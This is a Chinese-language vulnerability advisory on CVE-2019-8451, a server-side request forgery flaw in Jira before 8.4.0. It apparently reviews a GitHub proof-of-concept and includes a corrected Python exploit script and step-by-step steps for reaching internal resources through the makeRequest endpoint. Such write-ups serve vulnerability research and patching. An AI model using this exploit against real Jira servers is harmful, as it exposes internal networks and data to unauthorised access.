## CVE-2019-8451 Jira SSRF漏洞

**漏洞编号:** CVE-2019-8451

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Jira

**危害等级:** 高危，可能导致内部信息泄露，攻击者可以利用该漏洞访问内部网络资源。

**影响版本:** < 8.4.0

**利用条件:** 需要能够访问存在漏洞的Jira实例的/plugins/servlet/gadgets/makeRequest端点

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-8451 是 Atlassian Jira 中的一个 SSRF 漏洞，存在于 8.4.0 之前的版本中。漏洞位于 /plugins/servlet/gadgets/makeRequest 资源处。由于 JiraWhitelist 类中的逻辑错误，远程攻击者可以通过该接口访问内部网络资源的内容。提供的Python POC代码尝试利用该漏洞，通过构造包含目标URL的URL，向Jira实例的 /plugins/servlet/gadgets/makeRequest 发送请求。需要注意的是，POC中的host变量的定义方式不正确，应使用http(s)://开头。此外, header中的`X-Atlassian-Token`和`Connection`的键和值之间缺少冒号 `:`。修复后的POC代码大概如下：

```python
import requests

host = 'http://target-jira.example.com:8080'
headers = {
    'X-Atlassian-Token': 'no-check',
    'Connection': 'close'
}

url = host + '/plugins/servlet/gadgets/makeRequest?url=' + host + '@www.baidu.com'
html = requests.get(url=url, headers=headers)
print(html.text)
```

**利用方式：**

1.  攻击者构造包含目标内部资源的URL，例如 `http://internal-server/secret.txt`。
2.  将构造的URL作为`url`参数的值，发送到Jira实例的 `/plugins/servlet/gadgets/makeRequest` 端点，例如：`/plugins/servlet/gadgets/makeRequest?url=http://internal-server/secret.txt`。
3.  Jira实例会向内部资源发起请求，并将响应内容返回给攻击者。

根据代码审核，没有发现恶意投毒代码，该脚本目的是验证漏洞，因此判断投毒风险为0%。

**项目地址:** [ianxtianxt/CVE-2019-8451](https://github.com/ianxtianxt/CVE-2019-8451)

**漏洞详情:** [CVE-2019-8451](https://nvd.nist.gov/vuln/detail/CVE-2019-8451)